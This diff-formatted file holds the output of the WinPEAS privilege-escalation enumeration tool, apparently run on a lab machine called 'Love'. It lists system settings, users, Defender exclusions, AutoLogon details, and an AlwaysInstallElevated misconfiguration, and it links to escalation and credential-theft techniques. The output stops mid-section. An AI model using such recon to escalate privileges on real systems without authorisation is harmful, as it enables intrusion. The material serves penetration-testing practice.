@@ -1,0 +1,2978 @@
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+  WinPEAS v2.0-beta by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------| 
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
+
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+   Creating Dynamic lists, this could take a while, please wait...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+   - Creating disabled users list...
+   - Admin users list...
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+
+
+  ==========================================(System Information)==========================================
+
+  [+] Basic System Information
+   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
+    Hostname: Love
+    ProductName: Windows 10 Pro
+    EditionID: Professional
+    ReleaseId: 2009
+    BuildBranch: vb_release
+    CurrentMajorVersionNumber: 10
+    CurrentVersion: 6.3
+    Architecture: AMD64
+    ProcessorCount: 2
+    SystemLang: en-US
+    KeyboardLang: English (United States)
+    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
+    IsVirtualMachine: True
+    Current Time: 5/3/2021 7:44:21 PM
+    HighIntegrity: False
+    PartOfDomain: False
+    Hotfixes: KB4601554, KB4562830, KB4570334, KB4577586, KB4580325, KB4586864, KB4589212, KB5001330, KB5001405, 
+
+  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 20H2 (19042)
+ [*] Enumerating installed KBs...
+ [*] Finished. Found 0 vulnerabilities.
+
+
+  [+] Showing All Microsoft Updates
+   HotFix ID                :   KB5001330
+   Installed At (UTC)       :   5/3/2021 10:51:29 PM
+   Title                    :   2021-04 Cumulative Update for Windows 10 Version 20H2 for x64-based Systems (KB5001330)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4023057
+   Installed At (UTC)       :   5/3/2021 10:38:25 PM
+   Title                    :   2021-03 Update for Windows 10 Version 20H2 for x64-based Systems (KB4023057)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.
+
+   =================================================================================================
+
+   HotFix ID                :   KB890830
+   Installed At (UTC)       :   5/3/2021 10:37:34 PM
+   Title                    :   Windows Malicious Software Removal Tool x64 - v5.88 (KB890830)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that is found. If an infection is found, the tool will display a status report the next time that you start your computer. A new version of the tool will be offered every month. If you want to manually run the tool on your computer, you can download a copy from the Microsoft Download Center, or you can run an online version from microsoft.com. This tool is not a replacement for an antivirus product. To help protect your computer, you should use an antivirus product.
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/14/2021 6:17:13 AM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.799.0)
+   Client Application ID    :   Windows Defender
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/13/2021 11:58:25 PM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.782.0)
+   Client Application ID    :   Windows Defender
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   
+   Installed At (UTC)       :   4/13/2021 10:37:26 PM
+   Title                    :   VMware, Inc. - Net - 1.8.17.0
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   VMware, Inc. Net  driver update released in  December 2020
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/13/2021 9:41:35 PM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.774.0)
+   Client Application ID    :   Windows Defender
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/13/2021 5:16:23 PM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.761.0)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/13/2021 5:57:30 AM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.723.0)
+   Client Application ID    :   Microsoft Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4052623
+   Installed At (UTC)       :   4/13/2021 5:57:30 AM
+   Title                    :   Update for Microsoft Defender Antivirus antimalware platform - KB4052623 (Version 4.18.2103.7)
+   Client Application ID    :   Microsoft Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
+   Description              :   This package will update Microsoft Defender Antivirus antimalware platform's components on the user machine.
+
+   =================================================================================================
+
+   HotFix ID                :   KB5000802
+   Installed At (UTC)       :   4/13/2021 3:38:51 AM
+   Title                    :   2021-03 Cumulative Update for Windows 10 Version 20H2 for x64-based Systems (KB5000802)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.
+
+   =================================================================================================
+
+   HotFix ID                :   KB2267602
+   Installed At (UTC)       :   4/13/2021 3:19:22 AM
+   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.335.717.0)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4601554
+   Installed At (UTC)       :   4/13/2021 3:19:13 AM
+   Title                    :   2021-02 Cumulative Update Preview for .NET Framework 3.5 and 4.8 for Windows 10, version 20H2 for x64 (KB4601554)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4023057
+   Installed At (UTC)       :   4/13/2021 3:18:30 AM
+   Title                    :   2021-01 Update for Windows 10 Version 20H2 for x64-based Systems (KB4023057)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4589212
+   Installed At (UTC)       :   4/13/2021 3:17:58 AM
+   Title                    :   2021-01 Update for Windows 10 Version 20H2 for x64-based Systems (KB4589212)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.
+
+   =================================================================================================
+
+   HotFix ID                :   KB4577586
+   Installed At (UTC)       :   4/13/2021 3:17:49 AM
+   Title                    :   Update for Removal of Adobe Flash Player for Windows 10 Version 20H2 for x64-based systems (KB4577586)
+   Client Application ID    :   MoUpdateOrchestrator
+   Description              :   This update will remove Adobe Flash Player from your Windows machine. After you install this item, you may have to restart your computer.
+
+   =================================================================================================
+
+
+  [+] System Last Shutdown Date/time (from Registry)
+
+    Last Shutdown Date/time        :    4/23/2021 4:36:33 AM
+
+  [+] User Environment Variables
+   [?] Check for some passwords or keys in the env variables 
+    COMPUTERNAME: LOVE
+    USERPROFILE: C:\Users\Phoebe
+    HOMEPATH: \Users\Phoebe
+    LOCALAPPDATA: C:\Users\Phoebe\AppData\Local
+    PSModulePath: C:\Users\Phoebe\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Phoebe\AppData\Local\Microsoft\WindowsApps;
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 23
+    LOGONSERVER: \\LOVE
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    HOMEDRIVE: C:
+    SystemRoot: C:\WINDOWS
+    SESSIONNAME: Console
+    ALLUSERSPROFILE: C:\ProgramData
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    AP_PARENT_PID: 5652
+    APPDATA: C:\Users\Phoebe\AppData\Roaming
+    PROCESSOR_REVISION: 3100
+    USERNAME: Phoebe
+    CommonProgramW6432: C:\Program Files\Common Files
+    OneDrive: C:\Users\Phoebe\OneDrive
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    USERDOMAIN_ROAMINGPROFILE: LOVE
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+    ComSpec: C:\WINDOWS\system32\cmd.exe
+    PROMPT: $P$G
+    SystemDrive: C:
+    TEMP: C:\Users\Phoebe\AppData\Local\Temp
+    ProgramFiles: C:\Program Files
+    NUMBER_OF_PROCESSORS: 2
+    TMP: C:\Users\Phoebe\AppData\Local\Temp
+    ProgramData: C:\ProgramData
+    ProgramW6432: C:\Program Files
+    windir: C:\WINDOWS
+    USERDOMAIN: LOVE
+    PUBLIC: C:\Users\Public
+
+  [+] System Environment Variables
+   [?] Check for some passwords or keys in the env variables 
+    ComSpec: C:\WINDOWS\system32\cmd.exe
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    OS: Windows_NT
+    Path: C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PROCESSOR_ARCHITECTURE: AMD64
+    TEMP: C:\WINDOWS\TEMP
+    TMP: C:\WINDOWS\TEMP
+    USERNAME: SYSTEM
+    windir: C:\WINDOWS
+    NUMBER_OF_PROCESSORS: 2
+    PROCESSOR_LEVEL: 23
+    PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
+    PROCESSOR_REVISION: 3100
+    PSModulePath: C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\
+
+  [+] Audit Settings
+   [?] Check what is being logged 
+    Not Found
+
+  [+] Audit Policy Settings - Classic & Advanced
+
+  [+] WEF Settings
+   [?] Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+  [+] LAPS Settings
+   [?] If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: LAPS not installed
+
+  [+] Wdigest
+   [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
+    Wdigest is not enabled
+
+  [+] LSA Protection
+   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
+    LSA Protection is not enabled
+
+  [+] Credentials Guard
+   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
+    CredentialGuard is not enabled
+    Virtualization Based Security Status:      Not enabled
+    Configured:                                False
+    Running:                                   False
+
+  [+] Cached Creds
+   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
+    cachedlogonscount is 10
+
+  [+] AV Information
+    Some AV was detected, search for bypasses
+    Name: Windows Defender
+    ProductEXE: windowsdefender://
+    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe
+    whitelistpaths:     C:\Administration
+    C:\xampp\htdocs\omrs
+
+  [+] Windows Defender configuration
+  Local Settings
+
+  Path Exclusions:
+    C:\Administration
+    C:\xampp\htdocs\omrs
+
+  PolicyManagerPathExclusions:
+    C:\Administration
+    C:\xampp\htdocs\omrs
+  Group Policy Settings
+
+  [+] UAC Status
+   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
+    ConsentPromptBehaviorAdmin: 0 - No prompting
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 1
+    FilterAdministratorToken: 0
+      [*] LocalAccountTokenFilterPolicy set to 1.
+      [+] Any local account can be used for lateral movement.
+
+  [+] PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.19041.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 51B
+
+  [+] Enumerating PowerShell Session Settings using the registry
+      You must be an administrator to run this check
+
+  [+] PS default transcripts history
+    [i] Read the PS history inside these files (if any)
+
+  [+] HKCU Internet Settings
+    CertificateRevocation: 1
+    DisableCachingOfSSLPages: 0
+    IE5_UA_Backup_Flag: 5.0
+    PrivacyAdvanced: 1
+    SecureProtocols: 2688
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    ZonesSecurityUpgrade: System.Byte[]
+    WarnonZoneCrossing: 0
+    EnableNegotiate: 1
+    ProxyEnable: 0
+    MigrateProxy: 1
+
+  [+] HKLM Internet Settings
+    ActiveXCache: C:\Windows\Downloaded Program Files
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    MinorVersion: 0
+    WarnOnIntranet: 1
+
+  [+] Drives Information
+   [?] Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 1 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
+
+  [+] Checking WSUS
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
+    Not Found
+
+  [+] Checking AlwaysInstallElevated
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+  [+] Enumerate LSA settings - auth packages included
+
+    auditbasedirectories                 :       0
+    auditbaseobjects                     :       0
+    Bounds                               :       00-30-00-00-00-20-00-00
+    crashonauditfail                     :       0
+    LimitBlankPasswordUse                :       1
+    NoLmHash                             :       1
+    Security Packages                    :       ""
+    Notification Packages                :       scecli
+    Authentication Packages              :       msv1_0
+    LsaCfgFlagsDefault                   :       0
+    SecureBoot                           :       1
+    disabledomaincreds                   :       0
+    everyoneincludesanonymous            :       0
+    forceguest                           :       0
+    restrictanonymous                    :       0
+    restrictanonymoussam                 :       1
+    fullprivilegeauditing                :       80
+    LsaCfgFlags                          :       0
+    LsaPid                               :       684
+    ProductType                          :       6
+
+  [+] Enumerating NTLM Settings
+  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+
+
+  NTLM Signing Settings
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : False
+      ServerNegotiateSigning  : False
+      LdapSigning             : Negotiate signing (Negotiate signing)
+
+  Session Security
+      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
+      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
+
+
+  NTLM Auditing and Restrictions
+      InboundRestrictions     :  (Not defined)
+      OutboundRestrictions    :  (Not defined)
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      : 
+
+  [+] Display Local Group Policy settings - local users/machine
+
+  [+] Checking AppLocker effective policy
+   AppLockerPolicy version: 1
+   listing rules:
+
+
+   File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
+   Translated Name:         (default rule) all windows installer files in c:\windows\installer
+   Description:             Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\Windows\Installer.
+   Action:                  Allow
+   User Or Group Sid:       S-1-1-0
+
+   Conditions
+   Path:                    %WINDIR%\Installer\*
+    No potential bypass found while recursively checking files/subfolders for write or equivalent permissions with depth: 3
+    Check permissions manually.
+
+   =================================================================================================
+
+   File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    (Default Rule) All Windows Installer files
+   Translated Name:         (default rule) all windows installer files
+   Description:             Allows members of the local Administrators group to run all Windows Installer files.
+   Action:                  Allow
+   User Or Group Sid:       S-1-5-32-544
+
+   Conditions
+   Path:                    *.*
+   =================================================================================================
+
+   File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    %OSDRIVE%\*
+   Translated Name:         c:
+   Description:             
+   Action:                  Deny
+   User Or Group Sid:       S-1-1-0
+
+   Conditions
+   Path:                    %OSDRIVE%\*
+    Directory "c:" Permissions: Authenticated Users [WriteData/CreateFiles]
+
+   =================================================================================================
+
+   File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    %OSDRIVE%\Administration\*
+   Translated Name:         c:\administration
+   Description:             
+   Action:                  Allow
+   User Or Group Sid:       S-1-5-21-2955427858-187959437-2037071653-1002
+
+   Conditions
+   Path:                    %OSDRIVE%\Administration\*
+    Directory "c:\administration" Permissions: Phoebe [AllAccess],Authenticated Users [WriteData/CreateFiles]
+
+   =================================================================================================
+
+   File Publisher Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    (Default Rule) All digitally signed Windows Installer files
+   Description:             Allows members of the Everyone group to run digitally signed Windows Installer files.
+   Action:                  Allow
+   User Or Group Sid:       S-1-1-0
+
+   Conditions
+   Binary Name:             *
+   Binary Version Range:    (0.0.0.0 - *)
+   Product Name:            *
+   Publisher Name:          *
+
+   =================================================================================================
+
+
+  [+] Enumerating Printers (WMI)
+      Name:                    OneNote for Windows 10
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;CIIO;RC;;;CO)(A;OIIO;RPWPSDRCWDWO;;;CO)(A;;SWRC;;;AC)(A;CIIO;RC;;;AC)(A;OIIO;RPWPSDRCWDWO;;;AC)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;RC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1002)(A;;LCSWSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1002)(A;OIIO;RPWPSDRCWDWO;;;LS)(A;;LCSWSDRCWDWO;;;LS)(A;OIIO;RPWPSDRCWDWO;;;BA)(A;;LCSWSDRCWDWO;;;BA)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Microsoft XPS Document Writer
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;LCSWSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Microsoft Print to PDF
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;LCSWSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
+      Is default:              True
+      Is network printer:      False
+
+   =================================================================================================
+
+      Name:                    Fax
+      Status:                  Unknown
+      Sddl:                    O:SYD:(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;LCSWSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2955427858-187959437-2037071653-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
+      Is default:              False
+      Is network printer:      False
+
+   =================================================================================================
+
+
+  [+] Enumerating Named Pipes
+  Name                                                                                                 Sddl
+
+  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  ROUTER                                                                                               O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
+
+  SearchTextHarvester                                                                                  O:SYG:SYD:P(D;;FA;;;NU)(D;;FA;;;BG)(A;;FR;;;IU)(A;;FA;;;SY)(A;;FA;;;BA)
+
+  vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+
+
+  [+] Enumerating AMSI registered providers
+
+  [+] Enumerating Sysmon configuration
+      You must be an administrator to run this check
+
+  [+] Enumerating Sysmon process creation logs (1)
+      You must be an administrator to run this check
+
+  [+] Installed .NET versions
+
+  CLR Versions
+   4.0.30319
+
+  .NET Versions
+   4.8.04084
+
+  .NET & AMSI (Anti-Malware Scan Interface) support
+      .NET version supports AMSI     : True
+      OS supports AMSI               : True
+        [!] The highest .NET version is enrolled in AMSI!
+
+
+  ==============================(Interesting Events information)==============================
+
+  [+] Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials
+
+      You must be an administrator to run this check
+
+  [+] Printing Account Logon Events (4624) for the last 10 days.
+
+      You must be an administrator to run this check
+
+  [+] Process creation events - searching logs (EID 4688) for sensitive data.
+
+      You must be an administrator to run this check
+
+  [+] PowerShell events - script block logs (EID 4104) - searching for sensitive data.
+
+
+  [+] Displaying Power off/on events for last 5 days
+
+  5/3/2021 8:31:39 AM     :  Startup
+
+
+  ===========================================(Users Information)===========================================
+
+  [+] Users
+   [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
+  Current user: Phoebe
+  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
+   =================================================================================================
+
+    LOVE\Administrator: Built-in account for administering the computer/domain
+        |->Groups: Administrators
+        |->Password: CanChange-NotExpi-Req
+
+    LOVE\DefaultAccount(Disabled): A user account managed by the system.
+        |->Groups: System Managed Accounts Group
+        |->Password: CanChange-NotExpi-NotReq
+
+    LOVE\Guest(Disabled): Built-in account for guest access to the computer/domain
+        |->Groups: Guests
+        |->Password: NotChange-NotExpi-NotReq
+
+    LOVE\Phoebe: Workstation Power User
+        |->Groups: Remote Management Users,Users
+        |->Password: CanChange-NotExpi-Req
+
+    LOVE\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
+        |->Password: CanChange-Expi-Req
+
+
+  [+] Current User Idle Time
+   Current User   :     LOVE\Phoebe
+   Idle Time      :     11h:12m:32s:843ms
+
+  [+] Display Tenant information (DsRegCmd.exe /status)
+   Tenant is NOT Azure AD Joined.
+
+  [+] Current Token privileges
+   [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
+    SeShutdownPrivilege: DISABLED
+    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+    SeUndockPrivilege: DISABLED
+    SeIncreaseWorkingSetPrivilege: DISABLED
+    SeTimeZonePrivilege: DISABLED
+
+  [+] Clipboard text
+
+  [+] Logged users
+    LOVE\Administrator
+    LOVE\Phoebe
+
+  [+] Display information about local users
+   Computer Name           :   LOVE
+   User Name               :   Administrator
+   User Id                 :   500
+   Is Enabled              :   True
+   User Type               :   Administrator
+   Comment                 :   Built-in account for administering the computer/domain
+   Last Logon              :   5/3/2021 7:43:52 PM
+   Logons Count            :   676
+   Password Last Set       :   4/12/2021 1:24:41 PM
+
+   =================================================================================================
+
+   Computer Name           :   LOVE
+   User Name               :   DefaultAccount
+   User Id                 :   503
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed by the system.
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   LOVE
+   User Name               :   Guest
+   User Id                 :   501
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   Built-in account for guest access to the computer/domain
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   1/1/1970 12:00:00 AM
+
+   =================================================================================================
+
+   Computer Name           :   LOVE
+   User Name               :   Phoebe
+   User Id                 :   1002
+   Is Enabled              :   True
+   User Type               :   User
+   Comment                 :   Workstation Power User
+   Last Logon              :   5/3/2021 8:32:01 AM
+   Logons Count            :   24
+   Password Last Set       :   4/12/2021 12:54:30 PM
+
+   =================================================================================================
+
+   Computer Name           :   LOVE
+   User Name               :   WDAGUtilityAccount
+   User Id                 :   504
+   Is Enabled              :   False
+   User Type               :   Guest
+   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
+   Last Logon              :   1/1/1970 12:00:00 AM
+   Logons Count            :   0
+   Password Last Set       :   4/12/2021 1:10:32 PM
+
+   =================================================================================================
+
+
+  [+] RDP Sessions
+    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
+    1         Console        Phoebe         LOVE                     Active    
+
+  [+] Ever logged users
+    LOVE\Administrator
+    LOVE\Phoebe
+
+  [+] Home folders found
+    C:\Users\Administrator
+    C:\Users\All Users
+    C:\Users\Default
+    C:\Users\Default User
+    C:\Users\Phoebe : Phoebe [AllAccess]
+    C:\Users\Public : Interactive [WriteData/CreateFiles]
+
+  [+] Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  LOVE
+    DefaultUserName               :  phoebe
+
+  [+] Password Policies
+   [?] Check for a possible brute-force 
+    Domain: Builtin
+    SID: S-1-5-32
+    MaxPasswordAge: 42.22:47:31.7437440
+    MinPasswordAge: 00:00:00
+    MinPasswordLength: 0
+    PasswordHistoryLength: 0
+    PasswordProperties: 0
+   =================================================================================================
+
+    Domain: LOVE
+    SID: S-1-5-21-2955427858-187959437-2037071653
